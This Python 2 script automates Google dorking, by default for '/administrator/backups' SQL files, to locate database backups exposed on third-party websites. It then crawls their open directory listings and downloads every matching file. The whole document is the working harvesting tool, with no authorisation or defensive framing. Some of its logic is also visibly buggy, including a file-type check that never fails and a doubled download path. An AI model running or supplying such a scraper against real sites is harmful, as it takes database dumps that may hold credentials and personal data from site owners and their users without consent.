### Created by Konstantinos Vaggelakos
### Used for finding interesting backups
### Use with care!

import sys
import re
import urllib2
import urlparse
import os
import httplib2
from google import search
from BeautifulSoup import BeautifulSoup, SoupStrainer


# Global vars
search_query = 'allinurl: %(search_term)s filetype:%(filetype)s'
download_dir = 'downloaded/'

# This is the main entry point for the application and will start searching immidiately after validating the input parameters
def main():
	# Check if there is a directory to store the files otherwise create it
	if not os.path.exists(download_dir):
		os.makedirs(download_dir)

	# Check input parameters
	if (len(sys.argv) != 4):
		start_search('/administrator/backups', 'sql', 20)
	else:
		start_search(sys.argv[1], sys.argv[2], sys.argv[3])


# start_search will init the search for the given search term
# @search_term The search term to search for when looking for 
# @filetype The filetype to look for
# @limit the upper limit of hosts to look into
def start_search(search_term, filetype, limit):
	print_settings(search_term, filetype, limit)
	# Start the search
	for url in search(search_query % vars(), stop=limit):
		handle_url(url, filetype)


# This method will check for more backups in the same directory if directory listing is available
# @url The url should be a url to an existing sql backup file
def handle_url(url, filetype):
	# Create directory to save dumps
	base_dir = url[0:url.rfind('/')]
	down_dir = download_dir + base_dir[7:base_dir.find('/',7)]

	print 'Digging into: %s' % base_dir
	if not os.path.exists(down_dir):
		os.makedirs(down_dir)
		print 'Created directory %s' % down_dir
	
	
	# Get all links on this page
	http = httplib2.Http()
	status, response = http.request(base_dir)


	for link in BeautifulSoup(response, parseOnlyThese=SoupStrainer('a')):
		if (link.has_key('href')):
			if (link['href'].find('.%s' % filetype) == None):
				print link['href'] + '%s was not of type: %s' % (link['href'], filetype)
			else:
				if (download_file(link['href'], down_dir + link['href'][link['href'].rfind('/'):]) == None):
					print 'There was a problem in downloading the file: %s' % link['href']


def download_file(url, filename):
	try:
		print 'Downloading file: %s into %s' % (url, filename)
		url_handle = urllib2.urlopen(url)
		localFile = open('downloaded/%s' % filename, 'w')
		localFile.write(url_handle.read())
		localFile.close()
	except:
		return None


# Prints the settings specified by the user
def print_settings(search_term, filetype, limit):
	print 'Search term: \'%s\'' % search_term
	print 'File type: %s' % filetype
	print 'Limit results: %i' % limit
	print 'Resulting query: \'%s\'' % search_query % vars()

main()
